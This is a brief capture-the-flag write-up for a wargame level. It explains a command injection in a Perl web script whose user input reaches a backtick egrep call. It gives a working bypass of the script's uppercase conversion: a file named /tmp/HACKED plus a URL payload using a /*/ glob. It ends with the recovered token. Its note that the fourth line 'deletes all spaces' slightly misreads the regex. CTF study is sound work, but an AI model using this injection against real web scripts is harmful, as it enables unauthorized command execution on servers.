Here, we have a perl file called level12.pl

If we cat it, we can see that several interesting lines:
# localhost:4646
$xx = $_[0];
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
@output = `egrep "^$xx" /tmp/xd 2>&1`;
n(t(param("x"), param("y")));

We can see a security hole in the line with egrep.
The problem here is the 3rd and the 4th lines:
-the 3rd will change every lower char to upper char
-the 4th will delete all spaces

To go through this, we will put our script in a file like this: /tmp/HACKED
and we'll put:
getflag > /tmp/whatever
don't forget to chmod 777 /tmp/HACKED so the perl file can execute it

after that we will go through the security hole by sending the file as the first param of the web page:
http://192.168.1.65:4646/level12.pl?x="`/*/HACKED`"
note: we use /*/ insteed of /tmp/ so it is not converted to /TMP/

Now we can cat /tmp/whatever to get our flag:
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
